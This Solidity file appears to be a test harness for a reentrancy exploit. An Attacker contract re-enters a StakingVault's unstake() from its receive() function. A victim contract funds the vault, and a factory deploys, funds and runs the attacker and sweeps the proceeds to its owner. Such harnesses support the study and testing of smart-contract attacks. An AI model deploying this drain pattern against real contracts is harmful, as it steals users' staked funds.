// SPDX-License-Identifier: Apache-2.0
pragma solidity >=0.8.0;

import "./Target.sol";

/// How an Attacker written for the harness finds out who the victim is. On a chain the
/// deployer has to be somebody who can answer, so the attacker's own factory does.
interface _ArbiterHarness { function arbiterVictim() external view returns (address); }
interface _ArbiterToken { function balanceOf(address) external view returns (uint256); }

contract Attacker {
    StakingVault p;
    bool reentered;
    constructor(address _p) {
        p = StakingVault(_p);
    }
    function attack() external {
        // stake 1 ether
        p.stake{value: 1 ether}();
        // trigger reentrancy
        p.unstake();
    }
    receive() external payable {
        if (!reentered) {
            reentered = true;
            p.unstake();
        }
    }
}

/// The victim's own contract. It runs setup in its constructor and holds the position,
/// so the account that deployed it is a user with something to lose rather than an
/// address somebody pranked.
contract ArbWorld {
    StakingVault target;
    address public owner;

    constructor() payable { owner = msg.sender;

        target = new StakingVault{value: 5 ether}();
    
    }

    function targetAddr() external view returns (address) { return address(target); }
    function enter() external payable {

        target.stake{value: 2 ether}();

    }
    function exit() external {

        target.unstake();

    }
    function sweep() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
    receive() external payable {}
}

/// The attacker's account deploys this, and this deploys the Attacker. It exists for
/// one reason: an Attacker written for the harness may ask its deployer who the victim
/// is, and on a chain the deployer has to be somebody who can answer.
contract AttackerFactory {
    address public victim;
    address public atk;
    address public owner;

    constructor(address v) payable { victim = v; owner = msg.sender; }
    function arbiterVictim() external view returns (address) { return victim; }

    function build(address t) external payable {
        atk = address(new Attacker(t));
        // The constructor does not take ether, so the capital is
        // sent after; an Attacker with no way to receive it simply
        // works with none, which is a fact about the attack.
        (bool funded, ) = atk.call{value: msg.value}("");
        funded;
    }
    function run() external {
        (bool ok, ) = atk.call(abi.encodeWithSignature("attack()"));
        require(ok, "attack reverted");
    }
    function sweep() external {
        atk.call(abi.encodeWithSignature("sweep()"));
        (bool ok, ) = owner.call{value: address(this).balance}("");
        ok;
    }
    receive() external payable {}
}
